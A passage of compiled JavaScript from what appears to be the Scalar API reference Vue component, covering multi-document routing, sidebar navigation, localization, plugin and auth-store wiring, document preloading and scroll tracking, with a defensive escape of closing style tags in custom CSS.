		*/
		const configList = computed(() => normalizeConfigurations(props.configuration));
		const isMultiDocument = computed(() => Object.keys(configList.value).length > 1);
		/** Search for the source with a default attribute or use the first one */
		const activeSlug = ref(Object.values(configList.value).find((c) => c.default)?.slug ?? configList.value[Object.keys(configList.value)?.[0] ?? ""]?.slug ?? "");
		/**
		* On initial page load we need to determine if there is a valid document slug in the URL
		*
		* If there is we set the active slug to the document slug
		*/
		if (typeof window !== "undefined") {
			const url = new URL(window.location.href);
			const apiParam = url.searchParams.get("api");
			if (apiParam && configList.value[apiParam]) {
				activeSlug.value = apiParam;
				const newUrl = makeUrlFromId(getIdFromUrl(url, configList.value[apiParam].config.pathRouting?.basePath, apiParam), configList.value[apiParam].config.pathRouting?.basePath, isMultiDocument.value);
				if (newUrl) {
					newUrl.searchParams.delete("api");
					window.history.replaceState({}, "", newUrl.toString());
				}
			}
			const documentSlug = getIdFromUrl(url, Object.values(configList.value).map((c) => c.config.pathRouting?.basePath).find((p) => p ? matchesBasePath(url, p) : false), isMultiDocument.value ? void 0 : activeSlug.value).split("/")[0];
			if (documentSlug && configList.value[documentSlug]) activeSlug.value = documentSlug;
		}
		/** Computed document options list for the selector logic */
		const documentOptionList = computed(() => Object.values(configList.value).map((c) => ({
			label: c.title,
			id: c.slug
		})));
		/**
		* AsyncAPI sidebar filters (protocol + server).
		*
		* These mirror the document picker: stacked dropdowns at the top of the sidebar
		* that narrow the visible operations. State resets whenever the active document
		* changes so a filter never leaks across documents.
		*/
		const selectedProtocol = ref("");
		const selectedServer = ref("");
		/** The active document, narrowed to AsyncAPI (or `null` for OpenAPI documents). */
		const activeAsyncApiDocument = computed(() => {
			const document = workspaceStore.workspace.activeDocument;
			return isAsyncApiDocument(document) ? document : null;
		});
		watch(activeSlug, () => {
			selectedProtocol.value = "";
			selectedServer.value = "";
		});
		/** Configuration overrides to apply to the selected document (from the localhost toolbar) */
		const configurationOverrides = ref({});
		const withLocalizedConfigurationDefaults = (config, activeConfig) => {
			const localization = resolveLocalization(config.localization);
			const configuredModelsSectionLabel = configurationOverrides.value.modelsSectionLabel ?? (activeConfig?.modelsSectionLabel !== "Models" ? activeConfig?.modelsSectionLabel : void 0);
			return {
				...config,
				modelsSectionLabel: configuredModelsSectionLabel ?? localization.translations.models.label ?? "Models"
			};
		};
		/** Any dev toolbar modifications are merged with the active configuration */
		const mergedConfig = computed(() => {
			const activeConfig = configList.value[activeSlug.value]?.config;
			const merged = {
				...coerce(apiReferenceConfigurationSchema, {}),
				...activeConfig,
				...configurationOverrides.value
			};
			return withLocalizedConfigurationDefaults(merged, activeConfig);
		});
		const apiReferenceLocalization = provideLocalization(() => mergedConfig.value.localization);
		const sidebarOptions = computed(() => ({
			...mergedConfig.value,
			labels: {
				closeGroup: apiReferenceLocalization.translate("navigation.closeGroup"),
				httpMethod: apiReferenceLocalization.translate("common.httpMethod"),
				openGroup: apiReferenceLocalization.translate("navigation.openGroup")
			}
		}));
		/**
		* Locale string for the `lang` attribute. We normalize underscores to hyphens so values like
		* `es_MX` become valid BCP-47 language tags (`es-MX`).
		*/
		const documentLang = computed(() => apiReferenceLocalization.locale.value.replace("_", "-"));
		/** Keep the detected host route stable while navigation changes the section hash. */
		const inferredHashBasePath = ref();
		/** Explicit routing always takes precedence over automatic host-prefix detection. */
		const basePath = computed(() => mergedConfig.value.pathRouting?.basePath ?? inferredHashBasePath.value);
		/**
		* Builds the href for a sidebar item so the sidebar renders real anchor tags.
		*
		* Rendering anchors (instead of buttons) lets search engines crawl the
		* navigation, and lets users open entries in a new tab.
		*/
		const getSidebarItemHref = (item) => makeHrefFromId(item.id, basePath.value, isMultiDocument.value);
		const themeStyle = computed(() => getThemeStyles(mergedConfig.value.theme, { fonts: mergedConfig.value.withDefaultFonts }));
		/**
		* Custom CSS plus the theme styles, injected into a single `<style>` tag.
		*
		* This is rendered with `v-html` so the CSS is emitted verbatim. Interpolating
		* it as text content makes Vue HTML-escape characters like `"` into `&quot;` on
		* the server while the client keeps `"`, which both breaks the CSS and causes a
		* hydration mismatch.
		*
		* A closing `</style>` tag is neutralized first. It never appears in valid CSS,
		* but during server rendering the string lands in the HTML stream unescaped, so
		* `customCss` coming from a docs platform where readers can supply their own
		* theme would otherwise be able to close the tag and open a `<script>`.
		*/
		const styleContent = computed(() => `${mergedConfig.value.customCss ?? ""}\n${themeStyle.value}`.replace(/<\/style/gi, "<\\/style"));
		/** Navigation State Handling */
		const collectWebhooks = (entries) => entries.flatMap((entry) => {
			const nested = "children" in entry && entry.children ? collectWebhooks(entry.children) : [];
			return entry.type === "webhook" ? [{
				name: entry.name,
				method: entry.method,
				id: entry.id
			}, ...nested] : nested;
		});
		if (typeof window !== "undefined") {
			const canonical = redirectUrl(window.location.href, slugify(mergedConfig.value.modelsSectionLabel ?? "Models"), activeSlug.value, isMultiDocument.value, basePath.value);
			if (canonical) window.history.replaceState({}, "", canonical.toString());
		}
		if (mergedConfig.value.redirect && typeof window !== "undefined") {
			const newPath = mergedConfig.value.redirect((mergedConfig.value.pathRouting ? window.location.pathname : "") + window.location.hash);
			if (newPath) window.history.replaceState({}, "", newPath);
		}
		/**
		* Sets the active slug and updates the URL with the selected document slug
		*
		* If an element ID is passed in we will configure the path or hash routing
		*/
		function syncSlugAndUrlWithDocument(slug, elementId, config) {
			const url = makeUrlFromId(elementId || slug, config.pathRouting?.basePath ?? inferredHashBasePath.value, isMultiDocument.value);
			if (url) window.history.replaceState({}, "", url.toString());
			activeSlug.value = slug;
		}
		/** Workspace Store Initialization */
		/**
		* Initializes the new client workspace store.
		*/
		const workspaceStore = createWorkspaceStore({ verbose: isDevelopment });
		provide(EXTERNAL_EXAMPLES, () => workspaceStore.externalExamples());
		/**
		* We need to keep the client store separate from the workspace store
		* This is because we want the client store to be a playground where users can test out their requests without affecting the references store
		*/
		const clientStore = createWorkspaceStore({
			verbose: isDevelopment,
			plugins: [persistencePlugin({ persistAuth: () => mergedConfig.value.persistAuth ?? false })]
		});
		useDocumentEnvironment(workspaceStore);
		useDocumentEnvironment(clientStore);
		clientStore.externalExamples = workspaceStore.externalExamples;
		useConfiguredServers({
			configurations: configList,
			sourceStore: workspaceStore,
			clientStore
		});
		/** Preserve config server precedence while reading the values users edit in the client store. */
		const runtimeConfig = computed(() => {
			const config = mergedConfig.value;
			const document = clientStore.workspace.documents[activeSlug.value];
			return config.servers !== void 0 && isOpenApiDocument(document) ? {
				...config,
				servers: document.servers
			} : config;
		});
		/**
		* Plugin injection is not reactive. All plugins must be provided at first render.
		*
		* Created after the client store so the auth accessor below can read from it — plugin `onInit`
		* hooks may call `auth` synchronously during `notifyInit`. The reference-side Authentication panel
		* (Content → Auth.vue) persists credentials into `clientStore.auth`, so plugins must read the same
		* store to see what the user entered.
		*/
		const pluginManager = createPluginManager({
			plugins: Object.values(configList.value).flatMap((c) => c.config.plugins ?? []),
			/**
			* Read-only view of the global authentication state, so plugins can read stored secrets and
			* the selected security schemes without being able to mutate them. Wraps the client store's
			* auth methods (rather than passing the store directly) to keep the setters out of the plugin API.
			*
			* The getters return a deep copy (`export` already snapshots internally, the others go through
			* `toJsonCompatible`) so plugins receive plain data rather than the store's live reactive proxies —
			* mutating what they get back can never leak into the store.
			*/
			auth: {
				export: () => clientStore.auth.export(),
				getAuthSecrets: (documentName, schemeName) => toJsonCompatible(clientStore.auth.getAuthSecrets(documentName, schemeName)),
				getAuthSelectedSchemas: (payload) => toJsonCompatible(clientStore.auth.getAuthSelectedSchemas(payload))
			}
		});
		provide(PLUGIN_MANAGER_SYMBOL, pluginManager);
		pluginManager.notifyInit(mergedConfig.value);
		watch(mergedConfig, (config) => pluginManager.notifyConfigChange(config));
		const { toggleColorMode, isDarkMode } = useColorMode({
			initialColorMode: {
				true: "dark",
				false: "light",
				undefined: "system"
			}[String(mergedConfig.value.darkMode)],
			overrideColorMode: mergedConfig.value.forceDarkModeState
		});
		/**
		* The active document passed to the search modal. Both OpenAPI and AsyncAPI
		* documents are surfaced so the search index can pick up info.description
		* headings from either spec; AsyncAPI-specific entries (channels, operations,
		* messages) are not indexed yet.
		*/
		const activeSearchableDocument = computed(() => workspaceStore.workspace.activeDocument);
		/**
		* Sidebar entries contributed by plugin views (content.start / content.end).
		*
		* Each entry reuses the same id as the rendered plugin component, so the existing
		* navigation and scroll-spy logic can scroll to and highlight it. Plugins are static for
		* the lifetime of the manager, so this only needs to be resolved once.
		*/
		const pluginSidebarEntries = computed(() => pluginManager.getSidebarEntries(activeSlug.value).reduce((grouped, entry) => {
			grouped[entry.viewName].push({
				id: entry.id,
				title: entry.label,
				type: "text"
			});
			return grouped;
		}, {
			"content.start": [],
			"content.end": []
		}));
		/**
		* Localize the synthetic labels we generate for the sidebar (introduction, webhooks, and the models
		* section). Entries are only cloned when a label actually changes, so the common English-default case
		* does not allocate a new navigation tree on every recompute.
		*/
		const localizeNavigationEntries = (entries) => {
			const introductionTitle = apiReferenceLocalization.translate("navigation.introduction");
			const webhooksTitle = apiReferenceLocalization.translate("navigation.webhooks");
			const modelsSectionLabel = mergedConfig.value.modelsSectionLabel ?? "Models";
			const localize = (list) => {
				let changed = false;
				const result = list.map((entry) => {
					let localized = entry;
					if (isIntroductionEntry(entry) && entry.title !== introductionTitle) localized = {
						...entry,
						title: introductionTitle
					};
					else if (entry.type === "tag" && entry.isWebhooks === true && (entry.title !== webhooksTitle || entry.name !== webhooksTitle)) localized = {
						...entry,
						title: webhooksTitle,
						name: webhooksTitle
					};
					else if (entry.type === "models" && (entry.title !== modelsSectionLabel || entry.name !== modelsSectionLabel)) localized = {
						...entry,
						title: modelsSectionLabel,
						name: modelsSectionLabel
					};
					if ("children" in entry && entry.children) {
						const localizedChildren = localize(entry.children);
						if (localizedChildren !== entry.children) {
							localized = localized === entry ? { ...entry } : localized;
							localized.children = localizedChildren;
						}
					}
					if (localized !== entry) changed = true;
					return localized;
				});
				return changed ? result : list;
			};
			return localize(entries);
		};
		/** Initialize the sidebar */
		const sidebarState = createSidebarState(computed(() => {
			return Object.entries(workspaceStore.workspace.documents).map(([slug, document]) => {
				const children = document["x-scalar-navigation"]?.children ?? [];
				const childrenWithPlugins = slug === activeSlug.value ? [
					...pluginSidebarEntries.value["content.start"],
					...localizeNavigationEntries(children),
					...pluginSidebarEntries.value["content.end"]
				] : localizeNavigationEntries(children);
				return {
					id: slug,
					type: "document",
					description: document.info.description,
					name: document.info.title ?? slug,
					title: document.info.title ?? slug,
					children: childrenWithPlugins
				};
			});
		}), { hooks: {} });
		/** Recursively set all children of the given items to open */
		const setChildrenOpen = (items) => {
			items.forEach((item) => {
				if (item.type === "tag" || item.type === "models") sidebarState.setExpanded(item.id, true);
				if ("children" in item && item.children) setChildrenOpen(item.children);
			});
		};
		/** We get the sub items for the sidebar based on the configuration/document slug */
		const sidebarItems = computed(() => {
			const config = mergedConfig.value;
			if (!config) return [];
			const rawDocItems = sidebarState.items.value.find((item) => item.id === activeSlug.value)?.children ?? [];
			const docItems = activeAsyncApiDocument.value ? filterAsyncApiNavigation(rawDocItems, activeAsyncApiDocument.value, {
				protocol: selectedProtocol.value,
				server: selectedServer.value
			}) : rawDocItems;
			if (config.defaultOpenAllTags) setChildrenOpen(docItems);
			if (config.expandAllModelSections) {
				const models = docItems.find((item) => item.type === "models");
				if (models) {
					sidebarState.setExpanded(models.id, true);
					models.children?.forEach((child) => {
						sidebarState.setExpanded(child.id, true);
					});
				}
			}
			return docItems;
		});
		/** Find the sidebar entry that represents the introduction section */
		const infoSectionId = computed(() => sidebarItems.value.find(isIntroductionEntry)?.id ?? `${activeSlug.value}/description/introduction`);
		/**
		* Whether to render the crawler-only navigation links.
		*
		* The list is part of the server-rendered HTML so crawlers can discover the URL of every
		* sidebar entry, including the ones inside collapsed groups that the interactive sidebar
		* keeps out of the DOM. The flag must stay `true` through the client's hydration render —
		* flipping it any earlier (for example in onBeforeMount) would make the client render a
		* different tree than the server HTML and cause a hydration mismatch. Once the app is
		* interactive the real sidebar takes over, so the list is dropped right after mount.
		*/
		const showCrawlerNav = ref(true);
		onMounted(() => {
			showCrawlerNav.value = false;
		});
		/** User for mobile navigation */
		const breadcrumb = ref("");
		const slotProps = computed(() => ({ breadcrumb: breadcrumb.value }));
		const setBreadcrumb = (id) => {
			const item = sidebarState.getEntryById(id);
			if (!item || item.type === "document") breadcrumb.value = "";
			else breadcrumb.value = item.title;
		};
		/**
		* Ancestor tags (root → section in view) for the sticky context bar. Walks up
		* the reverse-indexed navigation tree from the selected entry, keeping only tag
		* nodes that render a header of their own. Empty for top-level sections, so the
		* reserved bar stays blank until a section is actually nested — deep OpenAPI 3.2
		* `parent` hierarchies that cannot be conveyed by indentation alone.
		*/
		const contextChain = computed(() => {
			const selectedId = sidebarState.selectedItem.value;
			if (!selectedId) return [];
			const crumbs = [];
			let node = sidebarState.getEntryById(selectedId);
			while (node) {
				if (node.type === "tag") {
					if (node.isTagGroup !== true || mergedConfig.value.layout === "classic") crumbs.unshift({
						id: node.id,
						title: node.title
					});
				}
				node = node.parent;
			}
			return crumbs;
		});
		const scrollToLazyElement = (id) => {
			setBreadcrumb(id);
			sidebarState.setSelected(id);
			scrollToLazy(id, sidebarState.setExpanded, sidebarState.getEntryById);
		};
		/**
		* Updates the browser tab title via the user-provided `setPageTitle` callback.
		*
		* Called whenever the section in view changes — on sidebar clicks, on scroll, and
		* when switching documents — so the tab title always reflects what the reader sees.
		*/
		const updatePageTitle = (id) => {
			const setPageTitle = mergedConfig.value?.setPageTitle;
			const entry = sidebarState.getEntryById(id);
			if (!setPageTitle || typeof document === "undefined" || !entry?.title) return;
			const activeDocument = workspaceStore.workspace.activeDocument;
			document.title = setPageTitle({
				title: entry.title,
				document: {
					title: activeDocument?.info?.title ?? activeSlug.value,
					slug: activeSlug.value
				}
			});
		};
		/** Maps some config values to the workspace store to keep it reactive */
		mapConfigToWorkspaceStore({
			config: () => mergedConfig.value,
			store: workspaceStore,
			isDarkMode
		});
		mapConfigToWorkspaceStore({
			config: () => mergedConfig.value,
			store: clientStore,
			isDarkMode
		});
		/** Merged environment variables from workspace and document levels */
		const environment = computed(() => getActiveEnvironment(workspaceStore, workspaceStore.workspace.activeDocument ?? null).environment);
		if (typeof window !== "undefined") {
			const debugWindow = window;
			debugWindow.dataDumpWorkspace = () => workspaceStore;
		}
		__expose({
			eventBus,
			workspaceStore,
			sidebarItems
		});
		/**
		* Computes a mapping from model names to their sidebar entry IDs.
		*
		* We collect model entries from the whole navigation tree, not just the top-level `models` group,
		* so that schemas grouped under a tag via `x-tags` are still reachable by name.
		*
		* @see https://github.com/scalar/scalar/issues/9854
		*/
		const modelsIndex = computed(() => buildModelsIndex(sidebarItems.value));
		eventBus.on("scroll-to:model-by-name", ({ name }) => {
			/** Find the model in the models index */
			const model = modelsIndex.value[name];
			if (model) scrollToLazyElement(model);
		});
		const addDocument = async (input, navigationOptions) => {
			const result = await workspaceStore.addDocument(input, navigationOptions);
			const previousDocument = clientStore.workspace.documents[input.name];
			const selectedServer = previousDocument && typeof previousDocument === "object" ? previousDocument["x-scalar-selected-server"] : void 0;
			const nextDocument = safeDeepClone(workspaceStore.exportWorkspace().documents[input.name]) ?? {
				"openapi": "3.1.0",
				"info": {
					title: "",
					version: ""
				},
				"x-scalar-original-document-hash": ""
			};
			if (typeof selectedServer === "string") Object.assign(nextDocument, { "x-scalar-selected-server": selectedServer });
			clientStore.loadWorkspace({
				auth: {},
				documents: { [input.name]: nextDocument },
				intermediateDocuments: {},
				originalDocuments: {},
				overrides: {},
				history: {},
				meta: {}
			});
			return result;
		};
		/** In-flight document loads, so a background preload and a user selection never load the same document twice */
		const documentLoadPromises = /* @__PURE__ */ new Map();
		/**
		* Load a document into the workspace store by slug, fetching URL sources or using inline content.
		*
		* This does not change the active document, so it is safe to call in the background to warm up
		* documents the user has not selected yet. Repeated calls are deduplicated and it becomes a no-op
		* once the document is loaded.
		*/
		const ensureDocumentLoaded = (slug) => {
			if (workspaceStore.workspace.documents[slug]) return Promise.resolve();
			const pending = documentLoadPromises.get(slug);
			if (pending) return pending;
			const normalized = configList.value[slug];
			if (!normalized) return Promise.resolve();
			const config = withLocalizedConfigurationDefaults({
				...normalized.config,
				...configurationOverrides.value
			}, normalized.config);
			const promise = (async () => {
				const result = await addDocument(normalized.source.url ? {
					name: slug,
					url: normalized.source.url,
					fetch: config.customFetch
				} : {
					name: slug,
					document: normalized.source.content ?? {}
				}, config);
				const document = clientStore.workspace.documents[slug];
				if (result === true && isOpenApiDocument(document) && document["x-scalar-selected-server"] === void 0) {
					const servers = getServers(document.servers, {
						baseServerUrl: config.baseServerURL,
						documentUrl: normalized.source.url
					});
					if (servers.length > 0) clientStore.updateDocument(slug, "x-scalar-selected-server", servers[0].url);
				}
				if (result === true && config.defaultRequestBodyView && isOpenApiDocument(document) && document["x-scalar-default-request-body-view"] === void 0) clientStore.updateDocument(slug, "x-scalar-default-request-body-view", config.defaultRequestBodyView);
			})().finally(() => {
				documentLoadPromises.delete(slug);
			});
			documentLoadPromises.set(slug, promise);
			return promise;
		};
		/** Whether idle preloading has been stopped, for example when the component unmounts */
		let isPreloadStopped = false;
		/** Cancels the currently scheduled idle preload callback, if one is pending */
		let cancelScheduledPreload;
		/**
		* Stop any in-progress idle preloading. Without this, an orphaned instance (an Astro view
		* transition or a `createApiReference` remount) would keep fetching and parsing documents into
		* an abandoned store after unmount.
		*/
		const stopPreloadingDocuments = () => {
			isPreloadStopped = true;
			cancelScheduledPreload?.();
			cancelScheduledPreload = void 0;
		};
		/**
		* Warm up the documents the user has not selected yet while the browser is idle, so switching
		* between documents is instant. Runs on the client only and loads one document at a time to avoid
		* a burst of fetches and parsing work competing with the active document.
		*/
		const preloadDocumentsWhenIdle = () => {
			if (typeof window === "undefined") return;
			const pendingSlugs = Object.keys(configList.value).filter((slug) => !workspaceStore.workspace.documents[slug]);
			const scheduleIdle = (callback) => {
				if (typeof window.requestIdleCallback === "function") {
					const handle = window.requestIdleCallback(callback, { timeout: 1500 });
					cancelScheduledPreload = () => window.cancelIdleCallback(handle);
				} else {
					const handle = window.setTimeout(callback, 200);
					cancelScheduledPreload = () => window.clearTimeout(handle);
				}
			};
			const loadNext = () => {
				if (isPreloadStopped) return;
				const slug = pendingSlugs.shift();
				if (!slug) return;
				ensureDocumentLoaded(slug).finally(() => {
					if (!isPreloadStopped) scheduleIdle(loadNext);
				});
			};
			scheduleIdle(loadNext);
		};
		/**
		* Handle changing the active document
		*
		* 1. If the document has not be loaded to the workspace store we set it to empty and asynchronously load it
		* 2. If the document has been loaded to the workspace store we just set it to active
		* 3. If the content from the configuration has changes we need to update the document in the workspace store
		*/
		const changeSelectedDocument = async (slug, elementId) => {
			const normalized = configList.value[slug];
			if (!normalized) {
				console.warn(`Document ${slug} not found in configList`);
				return;
			}
			const config = withLocalizedConfigurationDefaults({
				...normalized.config,
				...configurationOverrides.value
			}, normalized.config);
			const onDocumentSelectPromise = config.onDocumentSelect?.();
			syncSlugAndUrlWithDocument(slug, elementId, config);
			apiClient.value?.route({ documentSlug: slug });
			await ensureDocumentLoaded(slug);
			workspaceStore.update("x-scalar-active-document", slug);
			clientStore.update("x-scalar-active-document", slug);
			if (elementId && typeof window !== "undefined") {
				const canonical = redirectUrl(window.location.href, slugify(config.modelsSectionLabel ?? "Models"), slug, isMultiDocument.value, config.pathRouting?.basePath ?? inferredHashBasePath.value, collectWebhooks(workspaceStore.workspace.activeDocument?.["x-scalar-navigation"]?.children ?? []));
				if (canonical) {
					window.history.replaceState({}, "", canonical.toString());
					elementId = getIdFromUrl(canonical.href, config.pathRouting?.basePath ?? inferredHashBasePath.value, isMultiDocument.value ? void 0 : slug) || elementId;
				}
			}
			if (config.persistAuth) loadAuthFromStorage(clientStore, slug);
			(async () => {
				await onDocumentSelectPromise;
				config.onLoaded?.(slug);
			})();
			if (elementId && elementId !== slug) scrollToLazyElement(elementId);
			else if (config.defaultOpenFirstTag) {
				const firstTag = sidebarItems.value.find((item) => item.type === "tag");
				if (firstTag) sidebarState.setExpanded(firstTag.id, true);
			}
			updatePageTitle(elementId && elementId !== slug ? elementId : slug);
		};
		/**
		* TODO:Move this to a dedicated updateDocument function in the future and
		* away from vue-reactivity based updates
		*/
		watch(() => Object.values(configList.value), async (newConfigList, oldConfigList) => {
			/**
			* Handles replacing and updating documents within the workspace store
			* when we detect configuration changes.
			*/
			const updateSource = async (updated, previous) => {
				const config = withLocalizedConfigurationDefaults({
					...updated.config,
					...configurationOverrides.value
				}, updated.config);
				/**
				* A background preload may still be loading this document against the previous
				* configuration. Wait for it to finish so the update below rebases onto the loaded
				* document instead of being skipped, which would otherwise leave stale content in the store.
				*/
				const pendingLoad = documentLoadPromises.get(updated.slug);
				if (pendingLoad) await pendingLoad;
				/** If we have not loaded the document previously we don't need to handle any updates to store */
				if (!workspaceStore.workspace.documents[updated.slug]) return;
				/** If the URL has changed we fetch and rebase */
				if (updated.source.url && updated.source.url !== previous?.source.url) {
					await addDocument({
						name: updated.slug,
						url: updated.source.url,
						fetch: config.customFetch
					}, config);
					return;
				}
				if (!updated.source.content) return;
				/**
				* We need to deeply check for document changes. Parse documents and then only rebase
				* if we detect deep changes in the two sources
				*/
				if (diff(updated.source.content, previous && "content" in previous.source ? previous.source.content ?? {} : {}).length) await addDocument({
					name: updated.slug,
					document: updated.source.content
				}, config);
			};
			newConfigList.forEach((newConfig, index) => updateSource(newConfig, oldConfigList[index]));
			const newSlugs = newConfigList.map((c) => c.slug);
			const oldSlugs = oldConfigList.map((c) => c.slug);
			if (newSlugs.length !== oldSlugs.length || !newSlugs.every((slug, index) => slug === oldSlugs[index])) await changeSelectedDocument(newSlugs[0] ?? "");
		}, { deep: true });
		/** Preload the first document during SSR */
		onServerPrefetch(() => changeSelectedDocument(activeSlug.value));
		/** Load the first document on page load */
		onBeforeMount(async () => {
			loadClientFromStorage(clientStore);
			if (basePath.value === void 0 && window.location.hash) {
				const hash = decodeURIComponent(window.location.hash.slice(1));
				const segments = new Set(hash.split("/"));
				const candidates = Object.keys(configList.value).filter((slug) => slug === activeSlug.value || isMultiDocument.value && segments.has(slug));
				await Promise.all(candidates.map((slug) => ensureDocumentLoaded(slug)));
				const prefix = resolveHashPrefix(hash, sidebarState.index.value.keys(), isMultiDocument.value);
				inferredHashBasePath.value = prefix ? `#${prefix}` : void 0;
				if (isMultiDocument.value) {
					const slug = getIdFromUrl(window.location.href, basePath.value, void 0).split("/")[0];
					if (slug && configList.value[slug]) activeSlug.value = slug;
				}
			}
			await changeSelectedDocument(activeSlug.value, getIdFromUrl(window.location.href, basePath.value, isMultiDocument.value ? void 0 : activeSlug.value));
			preloadDocumentsWhenIdle();
		});
		const documentUrl = computed(() => {
			return configList.value[activeSlug.value]?.source?.url;
		});
		/**
		* Determines if Agent Scalar should be enabled based on the configuration and the current URL
		*
		* - If the agent is disabled in the configuration, it should not be enabled
		* - If the current URL is a local URL, it should be enabled
		* - If the agent key is set, it should be enabled
		*/
		const agent = useAgent({ agentEnabled: computed(() => {
			if (configList.value[activeSlug.value]?.agent?.disabled) return false;
			if (typeof window !== "undefined" && isLocalUrl(window.location.href)) return true;
			return Boolean(configList.value[activeSlug.value]?.agent?.key);
		}) });
		provide(AGENT_CONTEXT_SYMBOL, agent);
		const AgentScalarDrawer = defineAsyncComponent(() => import("./AgentScalarDrawer.vue-BGVihDWJ.js"));
		const hasOpenedAgent = ref(false);
		watch(agent.showAgent, (open) => {
			if (open) hasOpenedAgent.value = true;
		});
		const stopReferenceClientEvents = initializeWorkspaceEventHandlers({
			eventBus,
			store: ref(clientStore),
			hooks: {}
		});
		const modal = useTemplateRef("modal");
		const clientLoadingStatus = ref("idle");
		const apiClient = useLazyApiClient({
			eventBus,
			status: clientLoadingStatus,
			load: async () => {
				const { createApiClientModal } = await import("./modal-B7At_mJL.js");
				return () => {
					if (!modal.value) return null;
					stopReferenceClientEvents();
					return createApiClientModal({
						el: modal.value,
						eventBus,
						workspaceStore: clientStore,
						options: runtimeConfig,
						plugins: [...pluginManager.getApiClientPlugins(), ...mapConfigPlugins(mergedConfig, environment)]
					});
				};
			}
		});
		onBeforeUnmount(() => {
			stopPreloadingDocuments();
			stopReferenceClientEvents();
			pluginManager.notifyDestroy();
		});
		/** Ensure we call the onServerChange callback */
		eventBus.on("server:update:selected", ({ url }) => mergedConfig.value.onServerChange?.(url));
		/**
		* AsyncAPI servers are keyed by name, so resolve the selected name to its
		* constructed connection URL before firing onServerChange, keeping the callback
		* payload consistent with OpenAPI (a URL string).
		*/
		eventBus.on("asyncapi-server:update:selected", ({ name }) => {
			const document = clientStore.workspace.activeDocument;
			if (!isAsyncApiDocument(document)) return;
			const server = getAsyncApiServers(document, { webSocketOnly: false }).find((s) => s.name === name);
			mergedConfig.value.onServerChange?.(server?.url ?? name);
		});
		/** Download the document from the store */
		eventBus.on("ui:download:document", ({ format }) => {
			const document = workspaceStore.exportActiveDocument(format);
			if (!document) {
				console.error("No document found to download");
				return;
			}
			downloadDocument(document, activeSlug.value ?? "openapi", format);
		});
		/**
		* Handler for a direct navigation event such as a sidebar or search click
		*
		* Depending on the item type we handle a selection event differently:
		*
		* - Tag: If a tag is closed we open it and all its parents and scroll to it
		*        If a tag is open we just close the tag
		* - Operation:
		*        Open all parents and scroll to the operation
		*/
		const handleSelectSidebarEntry = (id, caller) => {
			const item = sidebarState.getEntryById(id);
			updatePageTitle(id);
			if ((item?.type === "tag" || item?.type === "models" || item?.type === "text") && sidebarState.isExpanded(id) && sidebarState.selectedItem.value === id) {
				const unblock = blockIntersection();
				sidebarState.setExpanded(id, false);
				unblock();
				return;
			}
			if (item?.type !== "tag" && item?.type !== "models") isSidebarOpen.value = false;
			scrollToLazyElement(id);
			const url = makeUrlFromId(id, basePath.value, isMultiDocument.value);
			if (url) {
				window.history.pushState({}, "", url);
				if (caller === "sidebar") mergedConfig.value.onSidebarClick?.(url.toString());
			}
			if (agent.showAgent.value) agent.closeAgent();
		};
		/** Handle a navigation item selection event */
		eventBus.on("select:nav-item", ({ id }) => handleSelectSidebarEntry(id));
		/** Handle a scroll to navigation item event */
		eventBus.on("scroll-to:nav-item", ({ id }) => handleSelectSidebarEntry(id));
		/**
		* Sentinel rendered at the very start of the document. Its position resolves which entry an
		* intersecting section selects while the top of the document is still in view, and it drives the
		* observer set up further down.
		*/
		const documentStartRef = useTemplateRef("documentStartRef");
		/** Handle an intersecting navigation item event */
		eventBus.on("intersecting:nav-item", ({ id: intersectingId }) => {
			if (!intersectionEnabled.value) return;
			const id = resolveIntersectingEntry({
				id: intersectingId,
				documentStartId: infoSectionId.value,
				documentStartTop: documentStartRef.value?.getBoundingClientRect().top
			});
			sidebarState.setSelected(id);
			setBreadcrumb(id);
			updatePageTitle(id);
			scrollSidebarToTop(id);
			const url = makeUrlFromId(id, basePath.value, isMultiDocument.value);
			if (url && workspaceStore.workspace.activeDocument) window.history.replaceState({}, "", url.toString());
		});
		eventBus.on("toggle:nav-item", ({ id, open }) => {
			if (open) {
				mergedConfig.value.onShowMore?.(id);
				const entry = sidebarState.getEntryById(id);
				if (entry && "children" in entry && entry.children) {
					const first = entry.children[0];
					if (first) addToPriorityQueue(first.id);
				}
			}
			sidebarState.setExpanded(id, open ?? !sidebarState.isExpanded(id));
		});
		eventBus.on("copy-url:nav-item", ({ id }) => {
			const url = makeUrlFromId(id, basePath.value, isMultiDocument.value)?.toString();
			return url && copyToClipboard(url);
		});
		onBeforeMount(() => {
			window.history.scrollRestoration = "manual";
			addScalarClassesToHeadless();
			window.addEventListener("popstate", () => {
				const id = getIdFromUrl(window.location.href, basePath.value, isMultiDocument.value ? void 0 : activeSlug.value);
				if (id) scrollToLazyElement(id);
			});
		});
		/**
		* Uses `immediate` so the sentinel fires as soon as it enters the viewport (not just at the center strip).
		* When the user scrolls away from the top, both this observer and the first section's center-strip
		* observer are intersecting simultaneously, so the section observer does not re-fire on its own.
		* The `onExit` callback bridges that gap by finding whichever section is at the viewport center
		* and re-emitting the nav event for it.
		*
		* We emit the Introduction entry rather than the document slug so this sentinel and the Introduction
		* section's own intersection observer resolve to the same entry. Otherwise the two race at the top of
		* the document and the tab title flickers between the section title and the document title.
		*/
		useIntersection(documentStartRef, () => {
			eventBus.emit("intersecting:nav-item", { id: infoSectionId.value });
		}, {
			onExit: () => {
				const centerY = window.innerHeight / 2;
				const section = document.elementsFromPoint(window.innerWidth / 2, centerY).find((el) => el.tagName === "SECTION" && el.id);
				if (section?.id) eventBus.emit("intersecting:nav-item", { id: section.id });
			},
			immediate: true
		});
		const colorMode = computed(() => {
			const mode = workspaceStore.workspace["x-scalar-color-mode"];
			if (mode === "system") return getSystemModePreference();
			return mode;
		});
		const bodyScrollLocked = useScrollLock(typeof document !== "undefined" ? document.body : null);
		watch(agent.showAgent, () => bodyScrollLocked.value = agent.showAgent.value);
		const showMCPButton = computed(() => {
			if (mergedConfig.value.mcp?.disabled) return false;
			if (typeof window !== "undefined" && isLocalUrl(window.location.href)) return true;
			if (mergedConfig.value.mcp) return true;
			return false;
		});
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", null, [
				(openBlock(), createBlock(resolveDynamicComponent("style"), { innerHTML: styleContent.value }, null, 8, ["innerHTML"])),
				createBaseVNode("div", {
					ref: "documentEl",
					class: normalizeClass(["scalar-app scalar-api-reference references-layout", [{
						"scalar-api-references-standalone-mobile": mergedConfig.value.showSidebar,
						"scalar-scrollbars-obtrusive": obtrusiveScrollbars.value,
						"references-editable": mergedConfig.value.isEditable,
						"references-sidebar": mergedConfig.value.showSidebar,
						"references-sidebar-mobile-open": isSidebarOpen.value,
						"references-classic": mergedConfig.value.layout === "classic"
